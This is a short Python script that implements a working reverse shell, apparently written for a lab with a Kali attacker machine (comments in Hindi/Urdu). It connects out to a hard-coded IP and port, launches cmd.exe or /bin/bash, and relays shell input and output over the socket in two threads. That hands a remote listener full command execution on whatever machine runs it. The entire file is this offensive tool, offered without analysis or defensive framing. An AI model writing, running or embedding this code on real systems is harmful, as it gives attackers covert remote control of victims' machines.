import socket
import subprocess
import os

# ===== CONFIG =====
HOST = "192.168.56.101"   # ← Kali ka IP
PORT = 8044              # ← Listener port
# ==================

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    return s

def main():
    s = connect()

    # Windows par cmd.exe, Linux par /bin/bash
    if os.name == "nt":
        shell = "cmd.exe"
    else:
        shell = "/bin/bash"

    # Shell process start karein
    p = subprocess.Popen(
        shell,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        shell=False,
        bufsize=0
    )

    # ---- Thread 1: shell output -> socket ----
    def send_output():
        try:
            while True:
                data = p.stdout.read(1024)
                if not data:
                    break
                s.sendall(data)
        except Exception:
            pass

    # ---- Thread 2: socket input -> shell stdin ----
    def recv_command():
        try:
            while True:
                data = s.recv(1024)
                if not data:
                    break
                p.stdin.write(data)
                p.stdin.flush()
        except Exception:
            pass

    import threading
    t1 = threading.Thread(target=send_output, daemon=True)
    t2 = threading.Thread(target=recv_command, daemon=True)
    t1.start()
    t2.start()

    t1.join()
    t2.join()

    p.terminate()
    s.close()

if __name__ == "__main__":
    main()